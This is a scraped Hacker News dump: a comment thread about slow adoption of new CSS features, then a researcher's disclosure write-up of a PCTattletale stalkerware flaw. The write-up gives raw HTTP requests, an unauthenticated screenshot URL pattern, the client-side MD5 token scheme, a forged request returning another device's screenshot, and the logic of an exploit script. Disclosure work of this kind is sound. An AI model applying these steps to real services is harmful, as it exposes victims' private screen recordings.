magic in them. And like all tech debt, it's a triage. What I'd really like is more intellisense for css so I could take a css file and get sensible code complete and class suggestions for elements. reply agos 9 hours agorootparentyou raise a very important point: the tooling around CSS is nothing like we have everywhere else. you can get class completion with Tailwind or CSS Modules (which I prefer), but even basic stuff like CSS Variables or SASS mixins are a black hole reply 6510 10 hours agoparentprevOften I only use CSS if I have no choice. I really do try to fix it but I still cant imagine \"well written CSS\". I look at the 2000 lines of necessities and know some of it isn't even used and other things could be simpler. The process consumes lots of time without much to show for it or worse. reply rafark 18 hours agoprev> I can’t use [feature X], I need to support [old browser]. And that’s not necessarily a bad thing. As I commented a few days ago, nowadays devs don’t seem to care too much about backwards compatibility. I like to hold onto my devices longer than most people and it’s a bit frustrating to see that most sites nowadays expect you to be in the latest and greatest. It didn’t use to be like this. reply parhamn 17 hours agoparentI'm a bit torn on this when it comes to browsers. We recently had a user email us that our app stopped working for them. After we dug into it it was because their Chromebook was last updated in 2021 and didn't have Object.hasOwn (which a third-party library uses) and it's not even included in most common polyfills either. We fixed it, because I hate these sorts of compatibility issues. Nevertheless, I left a bit concerned that they hadn't updated their Chrome in 3 years. Software decays much quicker than hardware in a real way, especially with the never ending list of security vulnerabilities found every year. Theres definitely a case to be made that forcing software upgrades is good for the end user too. reply chrismorgan 15 hours agorootparentJust a remark on that specific case: Object.hasOwn landed in Chrome 93 in August 2021, and came last to Safari 15.4 in March 2022. My general advice is: never depend¹ on features less than two years old, avoid depending on features less than three years old, and treat two-and-a-half-year-old Safari as a bigger deal than one-and-a-half-year-old any other browser, because of how Safari major versions are tied to major OS versions to at least some extent². —⁂— ¹ When I say “depend” I mean “break if it’s not present”. A degraded but still functional experience is acceptable. ² I don’t use Apple stuff, so correct me if I’m wrong, but I believe that this used to be the case for macOS but may be fixed since macOS 12 , and is still the case with iOS et al. I believe iOS/Safari 15 is still the current version on some actively supported devices. reply yurishimo 13 hours agorootparentYes, macOS makes it possible to install newer Safari versions on older versions of the OS. However, if you are the type that doesn't update your major OS version regularly, you probably don't check for random software updates anyway, because Apple still shows the Safari updates in the same place as general OS updates. From the settings app, it's the same little red update dot regardless of what the update actually is. I suspect that many people who use old Safari versions are either used to sites being broken, or they use Chrome and don't care. I wish we had more data to verify those assumptions. reply 6510 11 hours agorootparentOne cant update an iphone if there is insufficient free storage, they may have very limited storage and there is no good way to manually move photos and videos to windows over usb or from icloud. People then end up deleting media one by one by hand while taking new pictures and making new videos. It can take a very long time. Most pictures are/feel more valuable than the update. reply yurishimo 10 hours agorootparentTotally. The phone problem I think is unavoidable for a large enough organization. At a certain size of company, with enough users, you just have to accept that your tech stack will lag behind for a few years, OR, you're going to spend an extraordinary amount of dev time building backwards compatibility for less capable devices. I find it silly how some people tack on \"just ship a fallback stylesheet\" as a legitimate answer (not accusing you) because we all know that it's never that simple. reply 6510 10 hours agorootparentI just don't use any of the new features until someone complaints about it. If support is there and it doesn't make it impossible to reason about ill adopt it and thank them. @container style(color: green) and style(background-color: transparent), not style(background-color: red), style(--themeBackground), style(--themeColor: blue) or style(--themeColor: purple), (max-width: 100vw) and style(max-width: 600px) { /**/ } It is useful as a selector for people. Best not let that guy anywhere near my code. reply panzerboiler 14 hours agorootparentprevOn my 2012 macbookpro I am forced to use chrome or orion since safari is stuck on 15.X. On my 2015 iMac I can still use the current version of safari, but probably not safari 18 when it will come out. So, for now, the cut-off is 10 years. Pretty good I would say. reply PinguTS 9 hours agorootparentprevSometimes you can't even update. I have an iPad that is perfectly fine for browsing. We use it mainly for TV purposes. It doesn't get any updates anymore. Now, some streaming services do not work anymore, because the website doesn't work. Why? There is no real technical reason for this. For some streaming services I have a collection of the real streaming URL. That still works fine. The problem is not the streaming itself, it's the website to choose the right stream. reply jwells89 15 hours agorootparentprevYes, for browsers the window for what qualifies as being recent enough to be safe has shrunken dramatically. I’d be on edge about using a browser that hadn’t been updated in even one year… if I had to use a 2+ years outdated browser, I’d have it locked down (NoScript installed, bells and whistles like webfonts disabled, etc) and be much more cautious than I am normally. reply eviks 14 hours agorootparentprev> Software decays much quicker than hardware in a real way, especially with the never ending list of security vulnerabilities found every year. What's the connection to security vulns? How does that impact devs not using \"a separate stylesheet to support everyone.\" or ignoring \"progressive enhancement\"? Or what's the vulnerability explanation of hasOwn? It seems it mostly decays quicker on some webby platforms that culturally don't care much about backwards compatibility reply JimDabell 8 hours agorootparentSecurity vulnerabilities are found in browsers. Browsers are updated to fix the security vulnerabilities. People upgrade to the latest version to get the security fixes. If a person is using a browser that is years out of date, they are subject to a lot of security vulnerabilities in a piece of software that is constantly exposed to untrusted code. Using an old browser is unsafe. If you encounter people using old browsers, you should strongly encourage them to do whatever they can to update their browser for their own good. If they do this, a nice side-effect is that you don’t have to support their older browser version. reply eviks 8 hours agorootparentYours is s PSA for updating browsers, but this doesn't explain breaking backwards compatibility since newer browsers with security updates don't break older CSS features. reply JimDabell 8 hours agorootparent> Nevertheless, I left a bit concerned that they hadn't updated their Chrome in 3 years. Software decays much quicker than hardware in a real way, especially with the never ending list of security vulnerabilities found every year. Theres definitely a case to be made that forcing software upgrades is good for the end user too. It seems very easy to understand the logic here. What part don’t you grasp? Don’t support older versions => this pressures them to upgrade => upgrading is good for their security. reply nine_k 13 hours agorootparentprevIs there a Chrome LTS channel? Firefox has an LTS version which can be a baseline for features, but which receives security updates at the very least. I don't know about, say, Chrome 80 line that would receive security fixes but not new features. I also think that would be against Google's interests to have such an LTS line, it would decrease the moat between it an other browsers. reply eviks 10 hours agorootparentWhy do you need Chrom LTS to use \"a separate stylesheet to support everyone.\"? reply nemomarx 17 hours agorootparentprevI think you can expect that for a Chromebook, but a different type of laptop might not support modern Chrome? I remember that Steam uses enough chromium nowadays that they had to drop support for Windows 7 early. Chrome doesn't have quite as long a support window for older OSes as the OSes do for security updates. reply Guidii 5 hours agorootparentIs that true? Windows 7 OS updates ended in 2020, while Chrome continued to update until M109 in 2023[1]. [1] https://support.google.com/chrome/thread/185534985/sunsettin.... reply onion2k 8 hours agoparentprev\"I can’t use [feature X], I need to support [old browser].\" Any time someone says this it's important to add a caveat of \"and I want my site to look the same everywhere\". Using @supports means you can feature detect what CSS the user's browser supports and enhance where possible. A user with an older browser might see a less pretty, simpler design with somewhat worse UX, but that's often ok if it's a tiny minority and you can give the users on new browsers a much better experience. The two versions might look a bit different but that's fine. reply wruza 16 hours agoparentprevThat is reasonable though if a missing feature is trivially obvious must-have. Browsers (and standards, and platforms) that are slow to add it must develop themselves better. It’s nice to respect compat if a new way is a redesign based on feedback, e.g. you used poll/select and now it’s epoll/kqueue/iocp with a fallback. But if it is a feature that was simply missing for years, e.g. UIKit adding random useful methods which existed since forever in Cocoa, no respect. Really, you don’t want to support a platform that takes years to wake up. Let their users know that it’s obsolete, they will update. reply the_other 10 hours agoparentprevIn my team, we write software for TVs and set-top boxes, as well as modern browsers. TVs don’t get the ipdate support we’re used to on desktop and mobile. The same codebase has to support Safari 6-era webkit as well as contemporary Blink. We still can’t use some of the flex spec let alone the new hotness. reply skolind 13 hours agoprevGreat article! CSS doesn’t get enough attention - not outside of Tailwind, which I don’t think is the way to go, but that’s another story. :has() and :is() are awesome. One issue I’ve had with any of the newer CSS features is that, most of the people I work with don’t know what they do, because nobody use them. So, I have to explain myself in each pull request - but I guess that’s ok, because then people learn. reply michaelnny 13 hours agoparentAgreed, I still prefer to write my own CSS than using tools like Tailwind. reply swagasaurus-rex 13 hours agorootparentFor specific components, I use explicit CSS, but for layoutI use the tailwind shorthand (flex, flex-row, mb-7) and just add those to my CSS as I go so I don't need tailwind as a dependency. It's the best of both worlds. reply paavohtl 12 hours agoprevThe answer in my team's case is browser support and especially Safari on iOS. Our UI is quite complex and demanding regarding functionality, visual presentation and accessibility and would benefit greatly from most of these features, especially subgrid and container queries (and anchor positioning, but that feature doesn't exist outside of the latest version of Chrome). Even though MDN lists most of these features as \"baseline\" supported, the reality is that a small but still meaningful share of our users are using old iOS devices – especially iPads – and they can't or won't update their operating system to update Safari. Our oldest supported browser is Safari 14 because of Flexbox gap support. None of the other platforms are a problem, as basically everyone else is using an automatically updating evergreen browser. reply Unai 5 hours agoparentI've read a few articles like this in the last few days and I don't understand why everyone is ignoring the elephant in the room. It's 2024 and Safari is still not evergreen. When people say Safari is the new Internet Explorer, replies always mention how Safari just adopted such and such bleeding edge CSS feature (while ignoring much older features, though), but the truth is many Apple users won't see those features for years, until their devices break. Apple is stopping both users and developers from enjoying these very same new features they so happily announce. The web is stuck in time, waiting for enough people to update their devices. Just like in the age of Internet Explorer. At least back then people had the option of installing a different browser. So maybe Safari and the apple ecosystem is actually worse than IE and Windows used to be. reply BeFlatXIII 2 hours agorootparent> but the truth is many Apple users won't see those features for years, until their devices break Yet another case of iPads being held back by their software. IIRC, iPads have slower replacement cycles than either iPhones or Macs. reply marcinreal 3 hours agoprevI simply need wide support. I made some websites for a client who receives many 1. older customers and 2. customers from all over the world. I was conscious of the possibility that these customers could have either ancient devices or some highly obscure foreign devices not reflected on caniuse.com. Now, if your domain ends in .dev you can just assume that your users are up-to-date techies, but otherwise I avoid anything newer than flexbox (which is just so useful). reply PaulStatezny 4 hours agoprevSome comments here are framing CSS as getting too complex. Some folks are recommending the utility-class approach (e.g. Tailwind). I don't want to argue for Tailwind, but as someone who's used it for ~4 years now, it strikes me that I've forgotten what it's like to have to think about sets of CSS rules and how they collide. Utility class systems completely remove the need to even consider conflicting rules. That doesn't mean CSS shouldn't continue to grow though, and I welcome these new features. reply npn 17 hours agoprevThis is a bad article. > And while support for Container Queries is green in all modern browsers, people still seem reluctant to go all-in, fearing they could break something as fundamental as site layout in older browsers. Don't you know there are still a fuck ton of people that are still using the old iOS versions with their old phones? I have plenty of them, and they are long term supporters that I just can't shut them off. There are new css features that are almost harmless and do not affect the usability, some css features on the other hand... reply InMice 16 hours agoprevWhats the eloquent javascript or think python equivalent for css? is it mdn docs or another? Does anyone know the best active, comprehensive online references? How else do you really keep up on all the crazy new stuff reply chrisweekly 15 hours agoparentGreat Q! Pretty much everyone in the field knows about MDN (https://developer.mozilla.org/en-US/ ) and https://web.dev and https://caniuse.com but the Interop project is newer and maybe flying under the radar: https://webkit.org/blog/14955/the-web-just-gets-better-with-... Enjoy! reply emmanueloga_ 9 hours agoparentprevThe state of CSS surveys [1]. -- 1: https://stateofcss.com/en-US reply sphars 16 hours agoparentprevIt may be ran by Google, but https://web.dev/ is one good source for keeping up with new web technologies reply kerkeslager 19 hours agoprev> Quick question: how many of these have you actively used in production? > Container Queries I haven't used this, but it looks super useful. > Style Queries Eh, I'm sure this is useful for situations that don't come up very often. > CSS Layers Ugh, I'm not going to use this overly-complex silliness, and I'm not looking forward to debugging this when other people use this. > Subgrid Again, overly complex. Grid could already do everything this can do, more simply. > Native Selector Nesting I'm already using this. > Anchor Positioning Eh, I already had solutions to this problem, but this seems like it probably communicates intent a bit better. I guess I'll pick that up. > :has, :is, :where :has is useful :is... okay, fine, syntactic sugar. :where I don't believe in hell. If I did, I'd be against it because burning someone for eternity is inhumane. But I might be willing to make an exception for people who write CSS that requires you to read the MDN article on Specificity to understand it. > Logical Properties Perhaps useful for situations that don't come up very often. Seems complex, but that might be because the thing it's representing is inherently complex. > Scroll-Linked Animations Okay, someone who isn't me will probably do really cool things with this. > View Transitions Another thing that seems complex, but possibly because the thing it's representing is inherently complex. reply azangru 4 hours agoparent> But I might be willing to make an exception for people who write CSS that requires you to read the MDN article on Specificity to understand it. May I ask you, are you a front-end developer? reply bobthepanda 18 hours agoparentprevi actually came up with a thing where subgrid would be useful, since subgrid lets you denote that a child wants to use the same grid as the parent. if you wanted to use grid template areas, and you had something that looked likeTitleThere isn't a great way to make theadhere to the grid template areas, because without subgrids only direct children (the ul) have coordinate attributes. reply noduerme 18 hours agorootparentI haven't needed to do CSS grids for awhile, but couldn't this have already been done with `display:contents` ? reply bobthepanda 15 hours agorootparentTIL about display:contents. I’ll have to check it out but it sounds like it does: https://bengammon.co.uk/css-grid-and-display-contents/ Subgrid lets you do it for anything more involved or deeper though. reply noduerme 13 hours agorootparentI think subgrid might give you a freer hand. Because if I remember correctly, the trouble with display:contents is that no other styles you put on that element will affect elements within it. This means shifting all styles down a node, which can be a real pain and have knock-on effects. reply yurishimo 13 hours agorootparentprev`display: contents` has a11y concerns in a lot of scenarios. The `ul` will be hidden from a screenreader and it will be read as `h1, li, li, li...` etc. It's a neat hack, but it's still a hack. reply richrichardsson 10 hours agorootparentAfter having seen a11y written about 100x times in Svelte warnings, it's finally dawned on me that it means accessibility, which is somewhat ironic that I had no idea what it meant all those times before. reply yurishimo 10 hours agorootparentPlease don't take this the wrong way, but can I ask how you personally find answers to similar solutions when they come up in your work/personal life? The first thing I do when I see an acronym or word I don't understand is go to Google and type `what is a11y webdev` or whatever. I think you get the idea. This has been a part of my life for almost 2 decades now so I'm curious how others handle the situation! What made you wait so long to find the answer? Did you eventually search for it, or did you finally read some document that spelled it out explicitly? Again, genuinely curious! I assume many people operate like I do and there is a line between explaining too little and too much. Understanding how others approach these problems hopefully will help me improve my own communication in the long run. reply nolongerthere 20 hours agoprevThis article is interesting but when we’re talking about design elements I think it’s always a good idea to include some actual demos or examples showing the final result and not just the “code”. I might also not be the target audience but I still don’t understand what container queries are or what old paradigm they’re replacing. The author does a good job explaining the difference between border-radius and the old way of using photoshop, but fails to do that for the features that he’s trying to promote. reply ervine 18 hours agoparentOld paradigm (media queries): You make layout changes based on the width / height of the viewport (browser). New paradigm (container queries): You make layout changes based on the width / height of the containing element. This lets you layout a component so that it looks good in any sized container. Picture a component that might be in the main section or in the sidebar - you can now just style directly based on width of the container instead of having to know the total width of sidebar + main section and do the calculation using viewport width. reply kevindamm 18 hours agorootparentAgreed, but to add to this: media queries are still useful, and since a media query may hide/remove entire containers in the view then the remaining containers may have widths that are no longer a simple proportion of the viewport width (or other property being selected for). So container queries can also enhance styles with media queries, not just replace them. reply tbm57 4 hours agoprevdon't call me a monkey for not using a tool that I don't need, thank you! reply andrecarini 12 hours agoprev> Anchor Positioning Are there selectors for this anchor relationship? e.g. style anchored element when anchor is on :hover reply 6510 10 hours agoprevI dunno sir, do you just assume everyone knows what these list items are? I would link them to their appropriate mdn article. I think non of the readers know everything about all of the items. This should be one of those articles one can click around in for considerable time. Having to select and search made me wonder at what point in time we lost the ability to click on the bullet to select the list item text? Does anyone remember that feature? reply AltruisticGapHN 20 hours agoprevCSS is becoming too complex. The syntax looks like it wants to be output by some compiler instead of being crafted by hand. Personally I also don't have any pleasure anymore writing CSS these days. Sass and BEM methodology works fantastically well. Naming things isn't that hard, but Tailwind/utility approach is also extremely useful. Those new features, besides container queries is just gibberish. Layer? WTF? The cascade is bad enough as it is, most devs can't even deal with the cascade it's why Tailwind become so popular. And we should dive even deeper into the cascade BS with layers and scoping and whatnpt? Again, this all looks like it was made to be output by some CSS compilers, not written by a developer. reply willio58 19 hours agoparentI’m unsure if you have specific feedback or just a general misunderstanding of the point of additions like layer to the spec. At the end of the day these are all more tools in our toolbelt. If you want you can keep writing CSS the same way you always have. reply culi 18 hours agorootparent> At the end of the day these are all more tools in our toolbelt. If you want you can keep writing CSS the same way you always have. I don't really stand by GP's comment but I also don't think their concern can be dismissed this easily. We generally write CSS as teams. You'll have to read as much CSS as you'll have to write. Ideally you actually read more than you write so you can reuse existing rules and follow established patterns Anyone writing CSS for a day-job, an OS project, or even just following a tutorial will have to at least familiarize themselves with these concepts reply bryanrasmussen 13 hours agorootparentit's sort of weird, there have been multiple comments where people have responded as if they write CSS all by themselves and there are no colleagues to worry about, and that they also think this is an industry-wide standard! on edit: just to note I'm generally the old guy who is pushing for people to use 'new' stuff like clamp, min, and max functions and lab color profiles, to no effect. reply paulryanrogers 19 hours agorootparentprevThere is a concern that one can have too many tools to do the same -- or very similar -- things. This can reduce readability. Consider Perl's many ways approach to Python's (initial) goal of one way. reply orhmeh09 16 hours agorootparentEvery new release of Python 3.x further erodes this idea. I like using the new features because I find Python generally inexpressive and verbose, but I have a hard time explaining to nondevelopers who read the code about the assignment expression, keyword only arguments, structural pattern matching, typing improvements and deprecations and so on. reply JimDabell 8 hours agoparentprevI’ve got the exact opposite reaction to you: the improvements to CSS are making the CSS I write simpler. reply notRobot 19 hours agoparentprevYou don't have to use the new fancy features, you can keep doing things the old way. reply pipeline_peak 19 hours agorootparentI think he means other people will though. reply cthor 14 hours agoparentprevJust because you don't understand it yet doesn't mean it isn't useful. An ideal version of CSS would remove the need for SASS, BEM, and any non-thematic framework. That we have to use those right now is a problem to be fixed. reply paulddraper 18 hours agoparentprevIs your complaint about the features, or the syntax? I think the syntax is good (getting better with nested selectors) reply holoduke 12 hours agoprevIf one wants to replicate exact similar behavior in a webapp conpared to a native app we need the scroll/view animation to be available in all browsers. Right now animation is only possible with js and results in jittery animations. reply baggy_trough 17 hours agoprevIf you want to use nesting, for example, you will have to give up WindowsYou’d need a separate stylesheet to support everyone. reply yurishimo 13 hours agorootparentIn theory it can, but when you work with 20 other devs all working on the same codebase, tracking those changes can become burdensome. Are we going to add an entirely new testing suite and workflow tools to save 5 lines of legacy CSS in favor of the new version? Probably not in a lot of teams. You also need to write and maintain code to conditionally load that fallback stylesheet and hope your users aren't using some weird user agent hacks (looking at you instagram in-app browser). All of these problems can be solved, but obviously nobody wants to because the juice is not worth the squeeze. This is not our first rodeo. I'm gonna wait another 18-24 months and then start using most of the features released this year. It's fine. reply spartanatreyu 17 hours agoprev [–] > Quick question: how many of these have you actively used in production? > Container Queries They aren't useful yet because: 1. Using them requires a wrapper element which can dirty up the HTML 2. While we were waiting for container queries to arrive, we also got new rules that made fluid layouts easier to implement which handle a chunk of container queries use cases. Container queries will become more useful when elements can query their own size, rather than their size inside a designated parent. > Style Queries A solution in search of a problem. Current selectors are acceptable for most current use cases. May be useful for customizable widget/dashboard style layouts. > CSS Layers Nice, but they currently place too many demands on the developer to understand what layers currently exist. These will become more useful as browser dev tools make debugging them easier to reduce the burden on the developer to keep the layers in their mind while coding/debugging. > Subgrid Very useful when you need things aligned, especially in things like card layouts. The only thing holding this back is developers who are too reliant on 3rd party framework/libraries, e.g. bootstrap developers relying on grid column classes and tailwind developers building things with margin/padding everywhere. This will take time for developers to shift to, but those developer who limit themselves inside their own framework/library bubbles may never use them. > Native Selector Nesting Very nice quality-of-life improvement. > Anchor Positioning Only supported by one browser. I have no idea why this was even in the article to begin with. But it will completely remove the need for some JS placement/layout logic that keeps getting reimplemented all the time with pop-ups (pave the desire paths and all that). It also has the potential to make margin notes easier. > :has, :is, :where :has is super powerful as a parent selector :where is great for simplifying repetitive css > Logical Properties If you maintain the discipline required to use these aliases over {top/left/down/right}, or if you have a linter to remind you, all of a sudden you're now able to support RTL languages without needing to spend time and money to make a different site for them. > Scroll-Linked Animations > View Transitions Both will be abused by marketers and \"designers\" who don't understand accessibility, but both will also greatly simplify micro-interactions on proper websites that aren't trying to be a \"marketing experience\". reply o11c 14 hours agoparent [–] :has isn't available in Firefox ESR (115) yet. The next ESR (128) will trickle out between July and October. @property (not mentioned) is only in Firefox Nightly; hopefully it makes it for 128 ... reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The article \"Old Dogs, New CSS Tricks\" explores the slow adoption of new CSS features despite their benefits and availability.",
      "Factors hindering adoption include cognitive resistance to change, the need to support older browsers, and outdated design trends.",
      "The author recommends evolving existing patterns, experimenting in side projects, and learning from best practices to gradually integrate new CSS techniques and improve code architecture."
    ],
    "commentSummary": [
      "The article examines why new CSS features, such as container queries, are underutilized despite high demand, citing timing mismatches, complexity, and reliance on older frameworks.",
      "Developers often prefer \"good enough\" solutions and are cautious about integrating new technologies due to past compatibility issues, especially with outdated browsers like Safari on iOS.",
      "There is a call for more advanced CSS tooling to improve robustness and maintainability, with resources like MDN, web.dev, and caniuse.com recommended for staying updated on web technologies."
    ],
    "points": 156,
    "commentCount": 87,
    "retryCount": 0,
    "time": 1716752797
  },
  {
    "id": 40486991,
    "title": "Critical Flaw in PcTattletale Exposes Users' Screen Recordings to Hackers",
    "originLink": "https://www.ericdaigle.ca/pctattletale-leaking-screen-captures/",
    "originBody": "May 22, 2024 PCTattletale leaks victims' screen recordings to entire Internet Background PCTattletale is a simple stalkerware app. Rather than the sophisticated monitoring of many similarly insecure competitors it simply asks for permission to record the targeted device (Android and Windows are supported) on infection. Afterward the observer can log in to an online portal and activate recording, at which point a screen capture is taken on the device and played on the target's browser. I recently discovered a serious vulnerability in PCTattletale's API allowing any attacker to obtain the most recent screen capture recorded from any device on which PCTattletale is installed. It is distinct from the IDOR previously discovered by Jo Coscia, and makes it trivial to actually obtain captures from other devices. As usual, Zack Whittaker has excellent coverage at TechCrunch. Unfortunately, PCTattletale have ignored Zack and I's attempts at contacting them to fix the issue, so I can't give any more details here to avoid encouraging abuse of the vulnerability. Hopefully the stalkerware author(s) can be bothered to fix the issue soon, at which point I can give a full writeup. In the meantime, if you think you may be a victim of stalkerware, run an antivirus scan — on Windows, Windows Defender seems to catch most known tools, on Android I've heard good things about Malwarebytes — and have a look at the excellent advice from the Coalition Against Stalkerware. UPDATE 2024-05-26 Well, it's been an eventful few days. Check out maia arson crimew's blog for details. Given that PCTattletale's entire AWS infrastructure has now been locked by Amazon, I can now give my original writeup. Part 0: setup I began by making an account on the website. This occurs in the following request-response, giving us an API key: METHOD: POST URL https://p200wi0b00.execute-api.us-east-2.amazonaws.com/Prod/api/pctt/member/ HEADERS Accept: application/json, text/javascript, */*; q=0.01 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.5 Connection: keep-alive Content-Length: 74 Content-Type: application/json Host: p200wi0b00.execute-api.us-east-2.amazonaws.com Origin: https://pctattletale.com Referer: https://pctattletale.com/ Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: cross-site User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0 {\"Username\": \"blah@blah.com\", \"Password\": \"42d388f8b1db997faaf7dab487f11290\"} // MD5 of the password STATUS: 200 OK HEADERS Access-Control-Allow-Origin: * Connection: keep-alive Content-Length: 112 Content-Type: text/plain; charset=utf-8 Date: Tue, 14 May 2024 16:12:35 GMT Strict-Transport-Security: max-age=2592000 Via: 1.1 207f5507d6d59dcf535e37d1db1f70bc.cloudfront.net (CloudFront) x-amz-apigw-id: XxMKGGEyiYcEocA= X-Amz-Cf-Id: L-w5nC30_R1FQhALRW93ifWgmgPLB26TE31RLRqZuZDb7iR5Ft1KGg== X-Amz-Cf-Pop: MXP53-P2 x-amzn-RequestId: 29cbf7ba-e16b-49a4-9435-323956b0f4e2 X-Amzn-Trace-Id: Root=1-66438d73-5fec59847a24356d76502520;Parent=4f04524f333e8710;Sampled=0;lineage=95e70599:0 X-Cache: Miss from cloudfront {\"APIKey\":\"89df2e57-2a4b-4e39-800a-8d1cc014d63b\",\"ResponseTime\":\"2024-05-14T16:12:35.597104+00:00\",\"MemberID\":0} The API key seems to serve as our account ID. Once the account is made, we are given a link to an APK to install on the target device. This installation proceeds as usual for a stalkerware app: we log in to the account we created and give a bunch of required permissions. After that, we can log into the dashboard in the browser and see our devices. Part 1: screenshot idor For each device, a thumbnail of a device screenshot is displayed. When we click on one, we see a \"screen capture\": it actually turns out to be a series of screenshots displayed quickly in a slideshow, creating a sort of stop-motion video. Since I'm using the free trial, I can only see the first few seconds. These screenshots seem like something IDOR-able, so let's take a look at the requests. Playing the video, we can see the screenshots being retrieved in the following request-responses: METHOD: GET URL https://pctattletalev2.s3-accelerate.amazonaws.com/62198/20240513/android/1715604626.jpg HEADERS Accept: image/avif,image/webp,*/* Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.5 Connection: keep-alive Host: pctattletalev2.s3-accelerate.amazonaws.com Referer: https://pctattletale.com/ Sec-Fetch-Dest: empty Sec-Fetch-Mode: no-cors Sec-Fetch-Site: cross-site User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0 STATUS: 200 OK HEADERS Accept-Ranges: bytes Connection: keep-alive Content-Length: 38661 Content-Type: image/jpeg Date: Tue, 14 May 2024 17:11:31 GMT ETag: \"a4a22ad1c62b70489757567ff678c593\" Last-Modified: Mon, 13 May 2024 19:50:32 GMT Server: AmazonS3 Via: 1.1 c704491f877b150c768ef14eb188ed46.cloudfront.net (CloudFront) X-Amz-Cf-Id: O0Nsl1S5yP2BPmHtdLIZ_6cARBxZErn-xKRaON7XhQ_B8_HwBG8Wiw== X-Amz-Cf-Pop: EWR53-C2 x-amz-id-2: 8wXPc+8xWC9/eXGwVqbDiAwP34lROWR7McJqzVVTOqrzBCtspIr+7cbp83OyuMysICXB+ubBxA0= x-amz-request-id: JRCP4QW6QVSCB6HJ x-amz-server-side-encryption: AES256 X-Cache: Miss from cloudfront *the screenshot of my device* Looking at the URL, it's in the format (id of the device I added)/(date)/(timestamp).jpg. There's no authentication happening at all here, so this is an IDOR over different device IDs! I later learned this had been independently discovered by Jo Coscia as mentioned above. Another interesting note looking at the screenshots is that they aren't taken every second. They are spaced out in seemingly random intervals, mostly concentrated between 1 and 10 seconds. This explains why the \"video\" in the browser is so choppy. Part 2: finding the latest screenshot If we know the address of one screenshot for a device, we can reasonably poke around neighbouring timestamps to find the rest of the capture. Unfortunately there are 86400 timestamps per day, so enumerating this across all days and all devices would take forever. When we load the devices overview, the thumbnail we're shown is of that device's latest screenshot. I wonder how that's being accessed? Let's reload the page and look at the requests again. We find this: METHOD: POST URL: https://5uw7yeva9g.execute-api.us-east-2.amazonaws.com/Prod/api/pctt/member/ffe3fc02-46d2-4275-a156-e65f2ae2ddad/62198/Live/ HEADERS Accept: application/json, text/javascript, */*; q=0.01 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.5 Connection: keep-alive Content-Length: 44 Content-Type: application/json Host: 5uw7yeva9g.execute-api.us-east-2.amazonaws.com Origin: https://pctattletale.com Referer: https://pctattletale.com/ Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: cross-site User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0 {\"Token\": \"07c7aa47c311b2e90b0cc50b53986141\"} STATUS: 200 OK HEADERS Access-Control-Allow-Origin: * Connection: keep-alive Content-Length: 133 Content-Type: text/plain; charset=utf-8 Date: Tue, 14 May 2024 17:12:06 GMT Strict-Transport-Security: max-age=2592000 Via: 1.1 f6acfb143216fabf7be9b3a603a486ae.cloudfront.net (CloudFront) x-amz-apigw-id: XxU3-Fk9iYcElIQ= X-Amz-Cf-Id: W0ypHoXaeNis5e7yjC1y619qE35BQNfRBPhp1odSFoRiBq6W6sUVjg== X-Amz-Cf-Pop: JFK50-P7 x-amzn-RequestId: 0c173b4d-0217-4300-956e-2cf33ad4caaf X-Amzn-Trace-Id: Root=1-66439b65-191b7f0a162b922a6d3de532;Parent=7893959ccf48044c;Sampled=0;lineage=63f6feca:0 X-Cache: Miss from cloudfront {\"lastScreenShot\":\"https://pctattletalev2.s3-accelerate.amazonaws.com/62198/20240513/android/1715604626.jpg\",\"idleTime\":\"1715604626\"} So that's how it gets the most recent screenshot. If we could get this for a device, we could easily get the rest of the capture! Unfortunately it seems to be protected in two ways: the URL contains the API Key (an unguessable UUID), and there's a token. Part 3: client-side token generation While looking for the last request, I noticed a bunch of JavaScript being pulled in from pctattletale.com. Most names seemed pretty innocuous, but on seeing \"member.area.dashboard.js\" I decided to take a look and see if I could find where that token was coming from. Incredibly, I found the following code for the request to update a device's status: function updateDevice(device, index) { var deviceToken = md5(API_KEY + \"\" + device.DeviceID); // Call Login WebService $.ajax({ method: \"POST\", crossDomain: true, contentType: \"application/json\", dataType: \"json\", url: AWS_BASE_URL_LIVE + \"api/pctt/member/\" + API_KEY + \"/\" + device.DeviceID + \"/Live/\", data: JSON.stringify({ Token: deviceToken }) }) .success(function(data) { [...] }) .fail(function() { [...] }); So the token is generated on the client-side, and is just MD5 of the device ID from the URL appended to the API key from account creation. Knowing this it is trivial to generate my own token and confirm that it matches the one being used in the requests. But I still can't get other devices' last screenshots because the URL and token both have the wrong API key, right? Part 4: clearly I have too much faith Let's give it a try. I make a token using my API key and the device ID one less than mine, and resend the above request with the corresponding url: METHOD: POST URL: https://5uw7yeva9g.execute-api.us-east-2.amazonaws.com/Prod/api/pctt/member/ffe3fc02-46d2-4275-a156-e65f2ae2ddad/62197/Live/ HEADERS Accept: application/json, text/javascript, */*; q=0.01 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.5 Connection: keep-alive Content-Length: 44 Content-Type: application/json Host: 5uw7yeva9g.execute-api.us-east-2.amazonaws.com Origin: https://pctattletale.com Referer: https://pctattletale.com/ Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: cross-site User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0 {\"Token\": \"7b431465c49fc326546d565315773a17\"} This happily gives me the lastScreenshot response for device ID 62197, which I do not own. It will do so for any device ID regardless of the UUID used in the URL and token. Part 5: putting together an exploit script Now that we can access any screenshot from any device and know the address of the last screenshot of the most recent recording, it's pretty easy to put together a script to leak the entirety of that recording. There's a minor annoyance in how the screenshots are taken at an irregular interval: we can't just subtract a certain amount of seconds. Instead we'll use a heuristic: we'll start with the last screenshot and subtract one second at a time, downloading from each and seeing if we get a valid photo or the error XML that comes up if no screenshot was taken at that second. If we get the error XML 20 times in a row, we'll assume the recording is over and give up. Together with the login and token code, this yields a simple exploit script That downloads the most recent screen capture from every device within the chosen range of IDs. Part 6: aftermath As described in better detail in maia's blog linked above, someone took my original post as inspiration and was able to recover 